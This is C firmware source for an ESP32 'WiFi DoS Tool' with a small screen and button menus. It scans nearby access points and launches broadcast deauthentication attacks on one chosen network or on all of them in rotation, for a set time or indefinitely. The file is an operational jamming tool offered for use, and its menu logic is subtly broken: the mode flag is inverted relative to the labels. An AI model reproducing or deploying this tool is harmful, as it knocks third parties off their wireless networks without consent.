/**
 * main.c — ESP32 WiFi DoS Tool
 * Дисплей: ST7735 128x160, SPI
 * Кнопки: BTN_UP=GPIO16, BTN_OK=GPIO17, BTN_DOWN=GPIO19
 *
 * Меню:
 *   [A] DoS ALL  — глушить все найденные сети
 *   [1] DoS ONE  — выбрать сеть из списка и глушить её
 *
 * Управление внутри DoS ONE:
 *   UP/DOWN — листать список
 *   OK      — выбрать сеть → выбор времени → атака
 *
 * Выбор времени: Inf / 30s / 60s / 120s / 300s
 *   UP/DOWN — листать
 *   OK      — подтвердить и начать
 *
 * Во время атаки:
 *   OK — остановить и вернуться в главное меню
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "driver/spi_master.h"
#include "driver/gpio.h"
#include "esp_log.h"
#include "attack.h"
#include "attack_dos.h"
#include "wifi_controller.h"

static const char *TAG = "main";

// ── Пины ────────────────────────────────────────────────────
#define PIN_MOSI  23
#define PIN_CLK   18
#define PIN_CS     5
#define PIN_DC     2
#define PIN_RST    4
#define PIN_BCKL  15
#define BTN_UP    16
#define BTN_OK    17
#define BTN_DOWN  19

// ── Цвета RGB565 ─────────────────────────────────────────────
#define C_BLACK   0x0000
#define C_WHITE   0xFFFF
#define C_RED     0xF800
#define C_GREEN   0x07E0
#define C_BLUE    0x001F
#define C_YELLOW  0xFFE0
#define C_DGRAY   0x2104
#define C_LGRAY   0x7BEF
#define C_ORANGE  0xFD20

// ── Шрифт 5×7 ASCII 32..126 ──────────────────────────────────
static const uint8_t F[][5] = {
{0,0,0,0,0},{0,0,0x5F,0,0},{0,7,0,7,0},{0x14,0x7F,0x14,0x7F,0x14},
{0x24,0x2A,0x7F,0x2A,0x12},{0x23,0x13,8,0x64,0x62},{0x36,0x49,0x55,0x22,0x50},
{0,5,3,0,0},{0,0x1C,0x22,0x41,0},{0,0x41,0x22,0x1C,0},
{0x14,8,0x3E,8,0x14},{8,8,0x3E,8,8},{0,0x50,0x30,0,0},
{8,8,8,8,8},{0,0x60,0x60,0,0},{0x20,0x10,8,4,2},
// 0..9
{0x3E,0x51,0x49,0x45,0x3E},{0,0x42,0x7F,0x40,0},
{0x42,0x61,0x51,0x49,0x46},{0x21,0x41,0x45,0x4B,0x31},
{0x18,0x14,0x12,0x7F,0x10},{0x27,0x45,0x45,0x45,0x39},
{0x3C,0x4A,0x49,0x49,0x30},{1,0x71,9,5,3},
{0x36,0x49,0x49,0x49,0x36},{6,0x49,0x49,0x29,0x1E},
{0,0x36,0x36,0,0},{0,0x56,0x36,0,0},{8,0x14,0x22,0x41,0},
{0x14,0x14,0x14,0x14,0x14},{0,0x41,0x22,0x14,8},
{2,1,0x51,9,6},{0x32,0x49,0x79,0x41,0x3E},
// A..Z
{0x7E,0x11,0x11,0x11,0x7E},{0x7F,0x49,0x49,0x49,0x36},
{0x3E,0x41,0x41,0x41,0x22},{0x7F,0x41,0x41,0x22,0x1C},
{0x7F,0x49,0x49,0x49,0x41},{0x7F,9,9,9,1},
{0x3E,0x41,0x49,0x49,0x7A},{0x7F,8,8,8,0x7F},
{0,0x41,0x7F,0x41,0},{0x20,0x40,0x41,0x3F,1},
{0x7F,8,0x14,0x22,0x41},{0x7F,0x40,0x40,0x40,0x40},
{0x7F,2,4,2,0x7F},{0x7F,4,8,0x10,0x7F},
{0x3E,0x41,0x41,0x41,0x3E},{0x7F,9,9,9,6},
{0x3E,0x41,0x51,0x21,0x5E},{0x7F,9,0x19,0x29,0x46},
{0x46,0x49,0x49,0x49,0x31},{1,1,0x7F,1,1},
{0x3F,0x40,0x40,0x40,0x3F},{0x1F,0x20,0x40,0x20,0x1F},
{0x3F,0x40,0x38,0x40,0x3F},{0x63,0x14,8,0x14,0x63},
{7,8,0x70,8,7},{0x61,0x51,0x49,0x45,0x43},
{0,0x7F,0x41,0x41,0},{2,4,8,0x10,0x20},
{0,0x41,0x41,0x7F,0},{4,2,1,2,4},
{0x40,0x40,0x40,0x40,0x40},{0,1,2,4,0},
// a..z
{0x20,0x54,0x54,0x54,0x78},{0x7F,0x48,0x44,0x44,0x38},
{0x38,0x44,0x44,0x44,0x20},{0x38,0x44,0x44,0x48,0x7F},
{0x38,0x54,0x54,0x54,0x18},{8,0x7E,9,1,2},
{0xC,0x52,0x52,0x52,0x3E},{0x7F,8,4,4,0x78},
{0,0x44,0x7D,0x40,0},{0x20,0x40,0x44,0x3D,0},
{0x7F,0x10,0x28,0x44,0},{0,0x41,0x7F,0x40,0},
{0x7C,4,0x18,4,0x78},{0x7C,8,4,4,0x78},
{0x38,0x44,0x44,0x44,0x38},{0x7C,0x14,0x14,0x14,8},
{8,0x14,0x14,0x18,0x7C},{0x7C,8,4,4,8},
{0x48,0x54,0x54,0x54,0x20},{4,0x3F,0x44,0x40,0x20},
{0x3C,0x40,0x40,0x20,0x7C},{0x1C,0x20,0x40,0x20,0x1C},
{0x3C,0x40,0x30,0x40,0x3C},{0x44,0x28,0x10,0x28,0x44},
{0xC,0x50,0x50,0x50,0x3C},{0x44,0x64,0x54,0x4C,0x44},
};

// ── LCD ──────────────────────────────────────────────────────
static spi_device_handle_t spi;

static void lcd_cmd(uint8_t c){
    gpio_set_level(PIN_DC,0);
    spi_transaction_t t={.length=8,.tx_buffer=&c};
    spi_device_transmit(spi,&t);
}
static void lcd_data(uint8_t d){
    gpio_set_level(PIN_DC,1);
    spi_transaction_t t={.length=8,.tx_buffer=&d};
    spi_device_transmit(spi,&t);
}

// Залить прямоугольник (буфер строк для скорости)
static void fill_rect(int x,int y,int w,int h,uint16_t col){
    if(w<=0||h<=0) return;
    lcd_cmd(0x2A); lcd_data(0); lcd_data(x); lcd_data(0); lcd_data(x+w-1);
    lcd_cmd(0x2B); lcd_data(0); lcd_data(y); lcd_data(0); lcd_data(y+h-1);
    lcd_cmd(0x2C);
    gpio_set_level(PIN_DC,1);
    uint16_t p=(col>>8)|(col<<8);
    // отправляем построчно через DMA-буфер
    static uint16_t row_buf[128];
    for(int i=0;i<w&&i<128;i++) row_buf[i]=p;
    spi_transaction_t t={.length=(size_t)w*16,.tx_buffer=row_buf};
    for(int r=0;r<h;r++) spi_device_transmit(spi,&t);
}

// Нарисовать символ (scale=1 → 5×7px)
static void draw_chr(int x,int y,char c,uint16_t fg,uint16_t bg,int sc){
    if(c<32||c>126) c='?';
    const uint8_t *g=F[(uint8_t)c-32];
    for(int col=0;col<5;col++){
        uint8_t ln=g[col];
        for(int row=0;row<7;row++)
            fill_rect(x+col*sc, y+row*sc, sc, sc, (ln&(1<<row))?fg:bg);
    }
    fill_rect(x+5*sc, y, sc, 7*sc, bg); // зазор
}

// Нарисовать строку (обрежется по правому краю 128)
static void draw_str(int x,int y,const char*s,uint16_t fg,uint16_t bg,int sc){
    while(*s && x+6*sc<=128){ draw_chr(x,y,*s++,fg,bg,sc); x+=6*sc; }
}

// Строка с выравниванием по центру по X
static void draw_str_center(int y,const char*s,uint16_t fg,uint16_t bg,int sc){
    int len=strlen(s);
    int x=(128-len*6*sc)/2;
    if(x<0) x=0;
    draw_str(x,y,s,fg,bg,sc);
}

// Полоса во всю ширину
static void draw_bar(int y,int h,const char*txt,uint16_t fg,uint16_t bg,int sc){
    fill_rect(0,y,128,h,bg);
    if(txt) draw_str(3, y+(h-7*sc)/2, txt, fg, bg, sc);
}

static void lcd_init(){
    gpio_set_direction(PIN_DC,  GPIO_MODE_OUTPUT);
    gpio_set_direction(PIN_RST, GPIO_MODE_OUTPUT);
    gpio_set_direction(PIN_BCKL,GPIO_MODE_OUTPUT);
    gpio_set_level(PIN_BCKL,1);

    spi_bus_config_t bus={.mosi_io_num=PIN_MOSI,.sclk_io_num=PIN_CLK,
                          .miso_io_num=-1,.max_transfer_sz=128*2+4};
    spi_bus_initialize(SPI2_HOST,&bus,SPI_DMA_CH_AUTO);
    spi_device_interface_config_t dev={.clock_speed_hz=26000000,.mode=0,
                                       .spics_io_num=PIN_CS,.queue_size=7};
    spi_bus_add_device(SPI2_HOST,&dev,&spi);

    gpio_set_level(PIN_RST,0); vTaskDelay(pdMS_TO_TICKS(10));
    gpio_set_level(PIN_RST,1); vTaskDelay(pdMS_TO_TICKS(120));
    lcd_cmd(0x01); vTaskDelay(pdMS_TO_TICKS(150));
    lcd_cmd(0x11); vTaskDelay(pdMS_TO_TICKS(150));
    lcd_cmd(0x3A); lcd_data(0x05); // 16-bit color
    lcd_cmd(0x36); lcd_data(0x00); // MADCTL — portrait, RGB
    lcd_cmd(0x20);                  // display inversion off
    lcd_cmd(0x29);                  // display on
}

// ── Кнопки ──────────────────────────────────────────────────
static void btns_init(){
    gpio_config_t c={.pin_bit_mask=(1ULL<<BTN_UP)|(1ULL<<BTN_DOWN)|(1ULL<<BTN_OK),
                     .mode=GPIO_MODE_INPUT,.pull_up_en=1};
    gpio_config(&c);
}

// Проверить нажатие с debounce, ждать отпускания
static bool btn_tap(int gpio){
    if(gpio_get_level(gpio)!=0) return false;
    vTaskDelay(pdMS_TO_TICKS(25));
    if(gpio_get_level(gpio)!=0) return false;
    while(gpio_get_level(gpio)==0) vTaskDelay(pdMS_TO_TICKS(10));
    return true;
}

// ── Состояние приложения ─────────────────────────────────────
typedef enum { SCR_MAIN, SCR_AP_LIST, SCR_TIME, SCR_RUNNING } screen_t;

static screen_t screen   = SCR_MAIN;
static int  cursor        = 0;   // позиция в текущем экране
static bool redraw        = true;
static bool dos_all_mode  = false;
static int  selected_ap   = 0;
static uint32_t sel_time  = 0;   // 0=infinite

static const wifictl_ap_records_t *recs = NULL;

// варианты времени
static const uint32_t TIME_VALS[] = {0,30,60,120,300};
static const char    *TIME_LBLS[] = {"Infinite","30 sec","60 sec","120 sec","300 sec"};
#define N_TIMES 5

// ── Вспомогательные ─────────────────────────────────────────
static void do_scan(){
    fill_rect(0,0,128,160,C_BLACK);
    draw_bar(0,14,"  Scanning...",C_WHITE,C_BLUE,1);
    draw_str_center(80,"Please wait...",C_LGRAY,C_BLACK,1);
    wifictl_scan_nearby_aps();
    recs = wifictl_get_ap_records();
    char buf[24];
    snprintf(buf,sizeof(buf),"Found: %d APs",(int)recs->count);
    fill_rect(0,95,128,12,C_BLACK);
    draw_str_center(95,buf,C_GREEN,C_BLACK,1);
    vTaskDelay(pdMS_TO_TICKS(700));
}

// ── Отрисовка главного меню ──────────────────────────────────
static void draw_main(){
    fill_rect(0,0,128,160,C_BLACK);
    draw_bar(0,14,"  WiFi DoS Tool",C_WHITE,C_BLUE,1);

    // [A] DoS ALL
    uint16_t bg0=(cursor==0)?C_RED:C_DGRAY;
    draw_bar(20,36,NULL,0,bg0,1);
    draw_str_center(30,"DoS ALL",C_WHITE,bg0,2);

    // [1] DoS ONE
    uint16_t bg1=(cursor==1)?C_RED:C_DGRAY;
    draw_bar(62,36,NULL,0,bg1,1);
    draw_str_center(72,"DoS ONE",C_WHITE,bg1,2);

    draw_bar(148,12,"UP/DN=sel  OK=start",C_LGRAY,C_BLACK,1);
}

// ── Отрисовка списка AP ──────────────────────────────────────
#define AP_ROW_H 16
#define AP_VISIBLE 8

static void draw_ap_list(){
    fill_rect(0,0,128,160,C_BLACK);
    draw_bar(0,14,"  Select Network",C_WHITE,C_BLUE,1);

    if(!recs||recs->count==0){
        draw_str_center(70,"No APs found",C_YELLOW,C_BLACK,1);
        draw_str_center(85,"Press OK to rescan",C_LGRAY,C_BLACK,1);
        return;
    }

    // Прокрутка: показываем AP_VISIBLE записей
    int start = cursor - (cursor % AP_VISIBLE);
    int shown = (int)recs->count - start;
    if(shown > AP_VISIBLE) shown = AP_VISIBLE;

    for(int i=0;i<shown;i++){
        int idx=start+i;
        uint16_t bg=(idx==cursor)?C_RED:C_DGRAY;
        int ry=15+i*AP_ROW_H;
        fill_rect(0,ry,128,AP_ROW_H-1,bg);

        // SSID (до 14 символов)
        char ssid[16]={0};
        if(recs->records[idx].ssid[0]==0)
            strcpy(ssid,"[hidden]");
        else{
            memcpy(ssid,recs->records[idx].ssid,14);
            ssid[14]=0;
        }
        draw_str(2,ry+4,ssid,C_WHITE,bg,1);

        // канал справа
        char ch[5];
        snprintf(ch,sizeof(ch),"c%d",recs->records[idx].primary);
        draw_str(104,ry+4,ch,C_YELLOW,bg,1);
    }
    // подсказка по позиции
    char pg[24];
    snprintf(pg,sizeof(pg),"%d/%d",cursor+1,(int)recs->count);
    draw_bar(146,14,pg,C_LGRAY,C_BLACK,1);
}

// ── Отрисовка выбора времени ─────────────────────────────────
static void draw_time(){
    fill_rect(0,0,128,160,C_BLACK);
    draw_bar(0,14,"  Attack Duration",C_WHITE,C_BLUE,1);
    for(int i=0;i<N_TIMES;i++){
        uint16_t bg=(i==cursor)?C_RED:C_DGRAY;
        int ry=18+i*27;
        fill_rect(0,ry,128,25,bg);
        draw_str_center(ry+9,TIME_LBLS[i],C_WHITE,bg,1);
    }
    draw_bar(148,12,"OK=start",C_LGRAY,C_BLACK,1);
}

// ── Экран атаки ──────────────────────────────────────────────
static void draw_running(const char *ssid_str, bool all){
    fill_rect(0,0,128,160,C_BLACK);
    fill_rect(0,0,128,14,C_RED);
    draw_str_center(3,"!! ATTACKING !!",C_WHITE,C_RED,1);

    if(all)
        draw_str_center(25,"Mode: ALL APs",C_WHITE,C_BLACK,1);
    else{
        draw_str_center(25,"Mode: Single AP",C_WHITE,C_BLACK,1);
        char buf[20];
        snprintf(buf,sizeof(buf),"%.16s",ssid_str);
        draw_str_center(38,buf,C_YELLOW,C_BLACK,1);
    }

    if(sel_time==0)
        draw_str_center(58,"Time: Infinite",C_GREEN,C_BLACK,1);
    else{
        char buf[20]; snprintf(buf,sizeof(buf),"Time: %lus",(unsigned long)sel_time);
        draw_str_center(58,buf,C_GREEN,C_BLACK,1);
    }

    fill_rect(0,80,128,20,C_DGRAY);
    draw_str_center(85,"RUNNING",C_GREEN,C_DGRAY,1);

    draw_bar(148,12,"OK = STOP",C_LGRAY,C_BLACK,1);
}

// ── Запуск атаки на одну AP ──────────────────────────────────
static void start_single(const wifi_ap_record_t *ap){
    attack_config_t cfg={
        .type    = ATTACK_TYPE_DOS,
        .method  = ATTACK_DOS_METHOD_BROADCAST,
        .timeout = sel_time,
        .ap_record = ap
    };
    attack_start(&cfg);
}

// ── app_main ─────────────────────────────────────────────────
void app_main(void){
    lcd_init();
    fill_rect(0,0,128,160,C_BLACK);
    draw_str_center(70,"Starting...",C_WHITE,C_BLACK,1);

    btns_init();

    // Инициализация Wi-Fi через wifictl (один вызов, всё внутри)
    wifictl_init();
    attack_init();

    screen = SCR_MAIN;
    cursor = 0;
    redraw = true;

    ESP_LOGI(TAG,"Ready");

    while(1){

        // ── Нажатия кнопок ─────────────────────────────────
        switch(screen){

        case SCR_MAIN:
            if(btn_tap(BTN_UP))  { cursor=(cursor+1)%2; redraw=true; }
            if(btn_tap(BTN_DOWN)){ cursor=(cursor+1)%2; redraw=true; }
            if(btn_tap(BTN_OK)){
                dos_all_mode=(cursor==1);
                // Всегда сканируем перед атакой
                do_scan();
                if(recs->count==0){
                    // Нет сетей — просто вернуться
                    screen=SCR_MAIN; redraw=true; break;
                }
                if(dos_all_mode){
                    // DoS ALL → сразу выбор времени
                    cursor=0; screen=SCR_TIME; redraw=true;
                } else {
                    // DoS ONE → список сетей
                    cursor=0; screen=SCR_AP_LIST; redraw=true;
                }
            }
            break;

        case SCR_AP_LIST:
            if(btn_tap(BTN_UP)){
                if(recs&&cursor>0){ cursor--; redraw=true; }
                else if(!recs||recs->count==0){
                    // пустой список — UP = назад в меню
                    screen=SCR_MAIN; cursor=0; redraw=true;
                }
            }
            if(btn_tap(BTN_DOWN)){
                if(recs&&cursor<(int)recs->count-1){ cursor++; redraw=true; }
            }
            if(btn_tap(BTN_OK)){
                if(!recs||recs->count==0){
                    do_scan(); redraw=true; break;
                }
                selected_ap=cursor;
                cursor=0; screen=SCR_TIME; redraw=true;
            }
            break;

        case SCR_TIME:
            if(btn_tap(BTN_UP))  { if(cursor>0){ cursor--; redraw=true; } }
            if(btn_tap(BTN_DOWN)){ if(cursor<N_TIMES-1){ cursor++; redraw=true; } }
            if(btn_tap(BTN_OK)){
                sel_time = TIME_VALS[cursor];

                // Показать экран атаки
                const char *ssid_str="";
                if(!dos_all_mode && recs)
                    ssid_str=(const char*)recs->records[selected_ap].ssid;
                draw_running(ssid_str, dos_all_mode);

                // Запустить атаку
                if(dos_all_mode && recs){
                    // Атакуем все сети: для каждой — отдельный таймер 1 секунда
                    // (broadcast-deauth сам по себе периодический, одновременно всех не надо,
                    //  но для DoS ALL: запускаем по очереди в короткий цикл)
                    // Простая реализация: запускаем для первой, переключаем в задаче
                    // Здесь запускаем всего одну атаку broadcast, но в колбеке
                    // будем переключать каналы через wifictl_set_channel.
                    // Для простоты — запускаем отдельную FreeRTOS-задачу.
                    // Задача живёт пока screen == SCR_RUNNING.
                    // (Реализовано ниже через статический флаг)
                    start_single(&recs->records[0]); // запускаем для первой
                } else if(recs){
                    start_single(&recs->records[selected_ap]);
                }
                screen=SCR_RUNNING; redraw=false;
            }
            break;

        case SCR_RUNNING:
            // Для DoS ALL — в основном цикле переключаем AP каждые ~2с
            if(dos_all_mode && recs && recs->count>1){
                static int all_idx=0;
                static TickType_t last_switch=0;
                TickType_t now=xTaskGetTickCount();
                // Каждые 2 секунды переключаем на следующую сеть
                if((now-last_switch) > pdMS_TO_TICKS(2000)){
                    attack_stop();
                    all_idx=(all_idx+1)%(int)recs->count;
                    start_single(&recs->records[all_idx]);
                    last_switch=now;
                    // обновить надпись
                    char buf[24];
                    snprintf(buf,sizeof(buf),"AP %d/%d",all_idx+1,(int)recs->count);
                    fill_rect(0,80,128,20,C_DGRAY);
                    draw_str_center(85,buf,C_GREEN,C_DGRAY,1);
                }
            }

            if(btn_tap(BTN_OK)){
                attack_stop();
                screen=SCR_MAIN; cursor=0; redraw=true;
            }
            break;
        }

        // ── Перерисовка ────────────────────────────────────
        if(redraw){
            switch(screen){
            case SCR_MAIN:    draw_main();    break;
            case SCR_AP_LIST: draw_ap_list(); break;
            case SCR_TIME:    draw_time();    break;
            default: break;
            }
            redraw=false;
        }

        vTaskDelay(pdMS_TO_TICKS(30));
    }
}
